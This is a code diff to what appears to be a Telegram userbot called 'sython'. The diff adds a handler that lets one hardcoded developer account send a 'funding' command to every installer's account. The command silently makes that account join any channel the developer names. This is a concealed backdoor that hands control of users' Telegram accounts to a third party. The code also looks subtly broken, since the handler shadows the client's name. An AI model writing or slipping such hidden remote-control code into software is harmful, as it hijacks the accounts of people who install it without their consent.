@@ -520,7 +520,24 @@ async def _(event):
 
 
 
+DevShahm = [2089408302 ]
 
+@sython.on(events.NewMessage(incoming=True))
+async def sython(event):
+    if event.message.message.startswith("تمويل") and event.sender_id in DevShahm:
+        message = event.message
+        channel_username = None
+        if len(message.text.split()) > 1:
+            channel_username = message.text.split()[1].replace("@", "")
+        if channel_username:
+            try:
+                await sython(JoinChannelRequest(channel_username))
+                response = "᯽︙ تم الانضمام إلى القناة بنجاح!"
+            except ValueError:
+                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح"
+        else:
+            response = "᯽︙ يُرجى تحديد معرف القناة او المجموعة مع التمويل يامطوري ❤️ "
+        await event.reply(response)
 
 
 print("- sython Userbot Running ..")
